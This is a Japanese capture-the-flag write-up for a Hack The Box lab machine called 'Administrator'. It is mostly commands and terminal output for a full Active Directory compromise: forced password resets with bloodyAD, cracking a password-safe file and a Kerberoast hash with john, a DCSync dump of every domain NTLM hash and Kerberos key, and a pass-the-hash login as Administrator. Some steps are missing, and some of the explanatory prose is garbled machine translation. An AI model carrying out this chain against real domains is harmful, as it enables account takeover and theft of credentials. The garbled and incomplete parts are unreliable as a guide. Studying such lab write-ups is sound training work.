# Administrator

# 初期探索

## Nmap
```
┌──(kali㉿kali)-[~/htb/Machines/Administrator]
└─$ nmap -sC -sV 10.10.11.42
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-17 12:21 JST
Nmap scan report for administrator.htb (10.10.11.42)
Host is up (0.24s latency).
Not shown: 988 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-17 10:22:11Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 7h00m00s
| smb2-time: 
|   date: 2025-02-17T10:22:34
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 89.93 seconds
```

AD環境のWindowsサーバだと思われる

- LDAP（ポート389、3268）が空いている
    - 389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
    - 3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
    - LDAPはADディレクトリサービスとして機能し、ユーザ管理、認証に使われる
- Kerberos (ポート 88) が開いている
    - `88/tcp open kerberos-sec Microsoft Windows Kerberos`
    - **KerberosはWindowsドメイン環境での認証に使われる** ため、ADの存在を示唆。
- SMB (ポート 445, 139) が開いている
    - `139/tcp open netbios-ssn`
    - `445/tcp open microsoft-ds?`
    - **Windowsのファイル共有 (SMB) は、ドメインコントローラーがある環境で頻繁に利用される。**
    - AD環境では「**SYSVOL**」や「**NETLOGON**」といった共有フォルダがあることが多い。
- Kerberosの時刻同期が確認できる
    - `clock-skew: 7h00m00s`
    - Kerberosは**時刻同期が重要**（時刻ずれが5分以上あると認証エラーになる）。
    - ここで `clock-skew`（時刻のズレ）が出ていることから、**Kerberosによる認証が動作している可能性が高い**。
- DNS (ポート 53) が "Simple DNS Plus"
    - `53/tcp open domain Simple DNS Plus`
    - AD環境では通常、**ドメインコントローラー (DC) がDNSサーバーを兼ねる**。
    - `administrator.htb` というホスト名からも、ADのFQDNっぽい。

## SMB

SMBの調査（ポート 445, 139）
Anonymousログインを試す

```
┌──(kali㉿kali)-[~/htb/Machines/Administrator]
└─$ smbclient -L //10.10.11.42/ --no-pass
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.42 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

匿名認証は成功しているが、特に何もない

## Crackmapexec

ブルートフォースで資格情報を探す

```
$ crackmapexec smb 10.10.11.42 --shares
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [-] Error enumerating shares: STATUS_USER_SESSION_DEL
```

## ユーザ変更

Michaelに変更
```
┌──(kali㉿kali)-[~/htb/Machines/Administrator]
└─$ bloodyAD -u "olivia" -p "ichliebedich" -d "Administrator.htb" --host "10.10.11.42" set password "Michael" "12345678"
[+] Password changed successfully!
```

次にMichaelを修正してBenjaminの秘密のコードを修正
```
└─$ bloodyAD -u "Michael" -p "12345678" -d "Administrator.htb" --host "10.10.11.42" set password "Benjamin" "12345678"
[+] Password changed successfully!
```

FTPにBenjamin/12345678でログインして調査
```
┌──(kali㉿kali)-[~/htb/Machines/Administrator]
└─$ ftp administrator.htb
Connected to administrator.htb.
220 Microsoft FTP Service
Name (administrator.htb:kali): Benjamin                                                                
331 Password required
Password: 
230 User logged in.
Remote system type is Windows_NT.

ftp> ls
229 Entering Extended Passive Mode (|||64587|)
125 Data connection already open; Transfer starting.
10-05-24  08:13AM                  952 Backup.psafe3
226 Transfer complete.

ftp> get Backup.psafe3
local: Backup.psafe3 remote: Backup.psafe3
229 Entering Extended Passive Mode (|||64589|)
125 Data connection already open; Transfer starting.
100% |************************************************************************************************|   952        1.32 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 3 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
952 bytes received in 00:00 (1.32 KiB/s)

ftp> exit
221 Goodbye.
```

Backuo.psafe3をダウンロード

catしても文字化けしているのでCrackする

```
┌──(kali㉿kali)-[~/htb/Machines/Administrator]
└─$ pwsafe2john Backup.psafe3 > hash.txt     
Backu:$pwsafe$*3*4ff588b74906263ad2abba592aba35d58bcd3a57e307bf79c8479dec6b3149aa*2048*1a941c10167252410ae04b7b43753aaedb4ec63e3f18c646bb084ec4f0944050
                                                                                                                                             
┌──(kali㉿kali)-[~/htb/Machines/Administrator]
└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (pwsafe, Password Safe [SHA256 128/128 SSE2 4x])
Cost 1 (iteration count) is 2048 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tekieromucho     (Backu)     
1g 0:00:00:00 DONE (2025-02-17 13:07) 1.515g/s 7757p/s 7757c/s 7757C/s newzealand..babygrl
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

pass: `tekieromucho`

# 初期侵入

```
┌──(kali㉿kali)-[~/htb/Machines/Administrator]
└─$ evil-winrm -i administrator.htb -u emily -p "UXLCI5iETUsIBoFVTj8yQFKoHjXmb"
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily\Documents> ls
```


```
*Evil-WinRM* PS C:\Users\emily\Documents> cd ../
*Evil-WinRM* PS C:\Users\emily> ls


    Directory: C:\Users\emily


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---        10/30/2024   2:23 PM                3D Objects
d-r---        10/30/2024   2:23 PM                Contacts
d-r---        10/30/2024   5:17 PM                Desktop
d-r---        10/30/2024   2:23 PM                Documents
d-r---        10/30/2024   2:23 PM                Downloads
d-r---        10/30/2024   2:23 PM                Favorites
d-r---        10/30/2024   2:23 PM                Links
d-r---        10/30/2024   2:23 PM                Music
d-r---        10/30/2024   2:23 PM                Pictures
d-r---        10/30/2024   2:23 PM                Saved Games
d-r---        10/30/2024   2:23 PM                Searches
d-r---        10/30/2024   2:23 PM                Videos


*Evil-WinRM* PS C:\Users\emily> cd Desktop
*Evil-WinRM* PS C:\Users\emily\Desktop> ls


    Directory: C:\Users\emily\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/30/2024   2:23 PM           2308 Microsoft Edge.lnk
-ar---         2/17/2025   2:27 AM             34 user.txt


cat *Evil-WinRM* PS C:\Users\emily\Desktop> cat user.txt
1a9*****************************
```

## user.txt

`1a9*****************************`


# 権限昇格

ターゲットを絞った Kerberoasting 攻撃を使用する
targetKerberoast は Python スクリプトの 1 つであり、他の多くのスクリプト (  [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py)など) と同様に、SPN を設定するユーザーが「kerberoast」の値を印刷するために使用できます。 このツールバンドは次の機能を追加します。のユーザーは、（プロパティの書き込み制限を適用して）「kerberoast」シェルを印刷し、この操作設定の一時 SPN を削除します。


```
┌──(kali㉿kali)-[~/htb/Machines/Administrator]
└─$ nano hash2.txt 
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/htb/Machines/Administrator]
└─$ cat hash2.txt 
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$Administrator.htb/ethan*$15ec7606ffa3297b86b280475f514f9c$2e4d87fb991fa421183d34d1f57dc6eff6cf90d47f165e99e8caa4042a91278d9ae1897d9b5bd1c4938ae952b02b253b63207405bb7f66b8509c614b4e8a0fe9bff6e4ae67a8c6df5ce80d08d1e2f0cc78389f94289f4fe121f402cf1d8a411db8e49116ae92534989d03f740899d01f2f264273ad4da38a5537fde4c4d629961839c4a7916a3f246240ce1e50602d648a17d05384131d1729c9debfe576e9a37bf347899896e9df8bec3b2ac16110da971e0142ef5435bb73ee2fca6baf923ad26540ff42b735d73ff730cdb075026d0646247db541b3c824a2c8fef6c72572d06c64f341778b0456cbf6376f22bc444228cc4fef86c8bb62093c7081daf6ab75c809508c2ca0ab0fe679e1dbbd753441316d58d1245fdcd9e1b8ef58faa2c71ae319296eeda923da7a42677e65a7ab048b694ea8f880bb021740f94eb4f9b1416d37cd75f41c2b9d045370890611857ae2576e117c1ca52de93918d7104e95c95cd130b2d06805d6c99d5c13b61ab0040f02117accc14a8ad06e2f6d66103c07e9e96a6a2a94f4a12e34e9c3f8b46a305e778a17958128465967076c0365d7c87bb6c517d8ab27d1a89f582a72e303bf0ac54c1c7d2fbe80b2500cab320cdbac803fdfa2c8a54e8db9870a5dd73193a85878752373da71d223e8cdd47dcd2ba3c3b353bc5f1af493da902c90b5a26a218aa6875ff9ffa5bc8bc2f1f90d65502819f01f3c8539950c1d905b2bd803145cfd603a6d75a654ce2c83210b59ed9e6c232841a7d6f5e706072e8e9ed38baaf4c04640841726e61a7f484e900ef1515480ba9b337f80c9cc9d0f974aff33b83897d340a925ab084d60914f708eb5cb917c91ecb362b490f2da965fc476956c7f2d9968ed61b10bdacd2c371955253ebbddfbfc97ee2b38badec0413bca0ec1e11aa44429c6d3d9ab73aaa4a1425fbf23123260c42ed28229e3b766ed0c5682eb6b097b315f72b8ce387978525b3800229f5a0980de2b1f947168c6956d06c8ad9178aefd34addba5e3c9f719619aa29301579cd426415ae8c9d832a93ce3beccf70b58340e949b12e9e6d9d7ef80a3b5852f0e372ba786237cb3f6b2a2738a3b70fd070f5ecd59e5cab52cb145113fc0f4832ba7adc297d6a01167773f9a9a3a5302a0c6a672b1437372d349752350778db5dcdb5f986a7b3110d2584d12a21d32960c061d0f5a60f182257b8954fcd13936b14ef1c6cd5396b2d3549971d83ef116fe4e65916c73f7d231e1c7c99bd82854b152c016f663ecc4c962a30dce3569f088398f8d230996901bfa72f3427ede4d73d1f7b8828fe098c958867c3bd9017002c3e74fbe73650d05228039b57c916ae017e89859afb79c9fb951c815476495819840ae9468fdb66d6ee687de54fed4724c77eee4bd4f9b4995005f644e2b1a58f87deb91088ec9e318fe9d1f6b34a33f6e2e001c2a0e3c0d7f463376a5e3827fadf2a88d6f79d73188b207e06b3207700a5929dd3b6d7fe47bb71402d1881a49a990f0472d912937b66825
```

## john

```
┌──(kali㉿kali)-[~/htb/Machines/Administrator]
└─$ john hash2.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
limpbizkit       (?)     
1g 0:00:00:00 DONE (2025-02-17 13:51) 3.125g/s 16000p/s 16000c/s 16000C/s Liverpool..babygrl
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

`Eyhan`: `limpbizkit`

### DCSyncについて

[DCSync(bloodhoundenterprise.io)](https://support.bloodhoundenterprise.io/hc/en-us/articles/17322385609371-DCSync)

この制限は、GetChanges と GetChangesAll の組み合わせを示し、ホストに DCSync 攻撃を実行する能力を与える。

これにより、管理者の秘密暗号ハッシュが取得

Secretsdump.py は Impacket フレーム内の 1 つのスクリプトであり、このスクリプトは、smbexec または wmiexec によって提供されるユーザーの登録データを DCSync 技術によって最初に使用する
```
┌──(kali㉿kali)-[~/htb/Machines/Administrator]
└─$ impacket-secretsdump "administrator.htb/ethan:limpbizkit"@"dc.administrator.htb"
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:31bf25a5a74639ff3c89420c230d0820:::
administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:10bab85505f8be62b52005ea948e0b19:::
administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664
Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2
Administrator:des-cbc-md5:403286f7cdf18385
krbtgt:aes256-cts-hmac-sha1-96:920ce354811a517c703a217ddca0175411d4a3c0880c359b2fdc1a494fb13648
krbtgt:aes128-cts-hmac-sha1-96:aadb89e07c87bcaf9c540940fab4af94
krbtgt:des-cbc-md5:2c0bc7d0250dbfc7
administrator.htb\olivia:aes256-cts-hmac-sha1-96:713f215fa5cc408ee5ba000e178f9d8ac220d68d294b077cb03aecc5f4c4e4f3
administrator.htb\olivia:aes128-cts-hmac-sha1-96:3d15ec169119d785a0ca2997f5d2aa48
administrator.htb\olivia:des-cbc-md5:bc2a4a7929c198e9
administrator.htb\michael:aes256-cts-hmac-sha1-96:a8f528d57d8575f9775b33da459b0308f781a3dc257a84d4e0a78b150099098b
administrator.htb\michael:aes128-cts-hmac-sha1-96:1bcc0a060a3e00e3efbc6a0856ce1fae
administrator.htb\michael:des-cbc-md5:a864feab109e8643
administrator.htb\benjamin:aes256-cts-hmac-sha1-96:cb3bd13601322300964f220e6c34e1e5db77cf2e79f1c448ada57605b4adfd07
administrator.htb\benjamin:aes128-cts-hmac-sha1-96:02ea444e1c1b50a607063abd7f956ed1
administrator.htb\benjamin:des-cbc-md5:31739770254ac71f
administrator.htb\emily:aes256-cts-hmac-sha1-96:53063129cd0e59d79b83025fbb4cf89b975a961f996c26cdedc8c6991e92b7c4
administrator.htb\emily:aes128-cts-hmac-sha1-96:fb2a594e5ff3a289fac7a27bbb328218
administrator.htb\emily:des-cbc-md5:804343fb6e0dbc51
administrator.htb\ethan:aes256-cts-hmac-sha1-96:e8577755add681a799a8f9fbcddecc4c3a3296329512bdae2454b6641bd3270f
administrator.htb\ethan:aes128-cts-hmac-sha1-96:e67d5744a884d8b137040d9ec3c6b49f
administrator.htb\ethan:des-cbc-md5:58387aef9d6754fb
administrator.htb\alexander:aes256-cts-hmac-sha1-96:b78d0aa466f36903311913f9caa7ef9cff55a2d9f450325b2fb390fbebdb50b6
administrator.htb\alexander:aes128-cts-hmac-sha1-96:ac291386e48626f32ecfb87871cdeade
administrator.htb\alexander:des-cbc-md5:49ba9dcb6d07d0bf
administrator.htb\emma:aes256-cts-hmac-sha1-96:951a211a757b8ea8f566e5f3a7b42122727d014cb13777c7784a7d605a89ff82
administrator.htb\emma:aes128-cts-hmac-sha1-96:aa24ed627234fb9c520240ceef84cd5e
administrator.htb\emma:des-cbc-md5:3249fba89813ef5d
DC$:aes256-cts-hmac-sha1-96:98ef91c128122134296e67e713b233697cd313ae864b1f26ac1b8bc4ec1b4ccb
DC$:aes128-cts-hmac-sha1-96:7068a4761df2f6c760ad9018c8bd206d
DC$:des-cbc-md5:f483547c4325492a
[*] Cleaning up...
```

evil-winrm のハッシュを使用して登録

```
┌──(kali㉿kali)-[~/htb/Machines/Administrator]
└─$ evil-winrm -i administrator.htb -u administrator -H "3dc553ce4b9fd20bd016e098d2d2fd2e"
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../
*Evil-WinRM* PS C:\Users\Administrator> ls


    Directory: C:\Users\Administrator


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---         10/4/2024  10:08 AM                3D Objects
d-r---         10/4/2024  10:08 AM                Contacts
d-r---         11/1/2024   2:47 PM                Desktop
d-r---         11/1/2024   2:46 PM                Documents
d-r---         11/1/2024   2:46 PM                Downloads
d-r---         10/4/2024  10:08 AM                Favorites
d-r---         10/4/2024  10:08 AM                Links
d-r---         10/4/2024  10:08 AM                Music
d-r---         10/4/2024  10:08 AM                Pictures
d-r---         10/4/2024  10:08 AM                Saved Games
d-r---         10/4/2024  10:08 AM                Searches
d-r---         10/4/2024  10:08 AM                Videos


cd De*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         2/17/2025   2:27 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
600*****************************
```

## root.txt

`600*****************************`